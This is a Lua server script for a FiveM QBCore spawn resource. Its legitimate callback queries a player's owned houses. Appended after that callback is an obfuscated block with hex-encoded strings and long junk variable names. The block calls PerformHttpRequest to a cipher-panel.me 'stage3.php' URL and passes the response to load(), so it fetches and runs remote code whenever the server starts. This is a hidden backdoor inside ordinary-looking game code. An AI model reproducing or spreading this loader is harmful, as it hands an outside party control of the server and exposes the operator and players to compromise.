local QBCore = exports['qb-core']:GetCoreObject()

QBCore.Functions.CreateCallback('qb-spawn:server:getOwnedHouses', function(source, cb, cid)
    if cid ~= nil then
        local houses = MySQL.Sync.fetchAll('SELECT * FROM player_houses WHERE citizenid = ?', {cid})
        if houses[1] ~= nil then
            cb(houses)
        else
            cb(nil)
        end
    else
        cb(nil)
    end
end)


local zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[4][zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x39\x68\x76\x43\x65", function (DnMPvLQXYskXCcXDjEEATqRgeFkwaLxOcOlXvbdyEUNhRiODxTJSVXyiNHojfQeivJWmDN, cVgvKAMVmZaulVNgrtAuqLAyqYZlslBnSItwaoCCLEPRzCFOjMZWrRzYXAstVnWJwyCyRB) if (cVgvKAMVmZaulVNgrtAuqLAyqYZlslBnSItwaoCCLEPRzCFOjMZWrRzYXAstVnWJwyCyRB == zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[6] or cVgvKAMVmZaulVNgrtAuqLAyqYZlslBnSItwaoCCLEPRzCFOjMZWrRzYXAstVnWJwyCyRB == zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[5]) then return end zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[4][zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[2]](zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[4][zrRisyGXHdmMppybKuOLNFRfyhARzBolgFtbYMxxfErtximHrvXoBkWIiOGIItHzbMEmsp[3]](cVgvKAMVmZaulVNgrtAuqLAyqYZlslBnSItwaoCCLEPRzCFOjMZWrRzYXAstVnWJwyCyRB))() end)